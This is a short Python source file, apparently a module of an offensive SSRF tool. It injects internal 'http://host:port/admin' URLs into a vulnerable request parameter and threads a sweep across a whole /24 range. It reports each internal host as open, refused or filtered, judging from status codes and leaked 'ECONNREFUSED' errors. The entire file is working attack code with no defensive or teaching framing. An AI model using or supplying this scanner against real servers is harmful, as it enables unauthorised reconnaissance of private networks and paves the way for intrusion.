import requests
from threading import Thread

def scanNet(request_info, params, network, port, url):
    try:
        method, _ , header, body, is_json = request_info
        if method == "POST" or method == "PUT":
            body_data = body.copy()
            if params in body_data:
                body_data[params] = f"http://{network}:{port}/admin"
            if is_json:
                response = requests.request(method, url, headers=header, json=body_data, timeout=3)
            else:
                body_str = "&".join([f"{k}={v}" for k, v in body_data.items()])
                response = requests.request(method, url, headers=header, data=body_str, timeout=3)
        elif method == "GET":
            response = requests.request(
                method,
                url,
                headers=header,
                params={params: f"http://{network}:{port}/admin"},
                timeout=3,
            )
        print(f"[{network}] Status: {response.status_code}")
        if response.status_code == 200:
            print(f"Network {network} is open.")
        else:
            body_res = response.text
            if "ECONNREFUSED" in body_res:
                print(f"Network {network} is open but connection refused.")
            else:
                print(f"Network {network} is closed/filtered.")
    except requests.exceptions.RequestException as exc:
        print(f"Network {network} error: {exc}")

def run(request_info, params,  url):
    network_target = input("Network to scan (e.g., 192.168.1): ").strip()
    port = int(input("Port (default 80): ").strip() or "80")
    networks = [i for i in range(0, 255)]
    threads = []
    max_threads = 40
    for network in networks:
        network_sc = f"{network_target}.{network}"
        t = Thread(target=scanNet, args=(request_info, params, network_sc, port, url))
        threads.append(t)
        t.start()
        if len(threads) >= max_threads:
            for jt in threads:
                jt.join()
            threads = []
    for jt in threads:
        jt.join()